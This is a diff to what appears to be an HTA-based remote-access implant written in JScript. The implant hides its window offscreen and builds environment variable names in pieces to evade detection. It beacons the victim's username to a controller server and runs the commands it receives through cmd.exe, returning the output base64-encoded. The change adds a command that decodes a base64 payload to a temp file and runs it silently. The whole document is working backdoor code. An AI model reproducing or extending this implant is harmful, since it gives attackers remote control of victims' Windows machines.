@@ -25,7 +25,6 @@ var temp = runner.ExpandEnvironmentStrings("%TE" +"MP%");
 var cs = runner.ExpandEnvironmentStrings("%C"+  "OmSP"    +"Ec%");
 var un = runner.ExpandEnvironmentStrings("%US"+  "ER"+"NA"+  "ME%");
 
-var retval = ""
 var id = Math.floor(Math.random() * 9999999999).toString()
 var type = "hta"
 var fso = new ActiveXObject("Scripting.FileSystemObject")
@@ -148,6 +147,7 @@ function main()
   {
     window.moveTo(-69, -420);
 
+    var retval = ""
     var checkin = '{"type": "'+type+'","id": '+id+',"un": "'+un+'"}';
     var serverMsg = post(home, checkin);
 	  var jsondata = "{" + serverMsg.split("{")[1].split("\n")[0]
@@ -178,13 +178,19 @@ function main()
         }
       }
 
-      else if((jsObject.cmnd.split(" ")[0] == "psh") || (jsObject.cmnd.split(" ")[0] == "cs")) {
+      else if((jsObject.cmnd.split(" ")[0] == "psh") || (jsObject.cmnd.split(" ")[0] == "cs") || (jsObject.cmnd.split(" ")[0] == "shc")) {
         fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
         msb = jsObject.cmnd.split(" ")[1]
         msbdata = b64d(jsObject.cmnd.split(" ")[2], "txt")
         fd.WriteLine(msbdata)
         fd.close()
-        runner.Run(cs +" /q /c " + msb + " " + temp + "\\" + id + ".txt" + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
+        if((jsObject.cmnd.split(" ")[0] == "shc")) {
+          runner.Run(cs +" /q /c " + msb + " " + temp + "\\" + id + ".txt", 0, true)
+          retval = "[*] Shc cmnd appeared successful"
+        }
+        else {
+          runner.Run(cs +" /q /c " + msb + " " + temp + "\\" + id + ".txt" + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
+        }
         if(fso.FileExists(temp + "\\__" + id + ".txt")) {
           fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
           retval = fd.ReadAll()
@@ -193,9 +199,6 @@ function main()
         }
         if(fso.FileExists(temp + "\\" + id + ".txt")) {
           fso.DeleteFile(temp + "\\" + id + ".txt", true)
-        }
-        else {
-          retval = "[!] Error getting output"
         }
       }
 	  
@@ -231,14 +234,17 @@ function main()
 	    else {
         runner.Run(cs +" /q /c " + jsObject.cmnd + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
 		    if(fso.FileExists(temp + "\\__" + id + ".txt")) {
-		      fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
-	        retval = fd.ReadAll()
-		      fd.close()
-		      fso.DeleteFile(temp + "\\__" + id + ".txt", true)
-		    }
-		    else {
-		      retval = "[!] Error getting output"
-	      }
+                      try {
+		        fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
+                        retval = fd.ReadAll()
+		        fd.close()
+		        fso.DeleteFile(temp + "\\__" + id + ".txt", true)
+                      }
+                      catch (e) { }
+                    }
+      }
+      if(retval == "") {
+        retval = "[*] No results to return or error getting result data"
       }
       var resp = '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","'+rettype+'":"'+b64e(retval)+'"}';
       jsObject.cmnd = ""
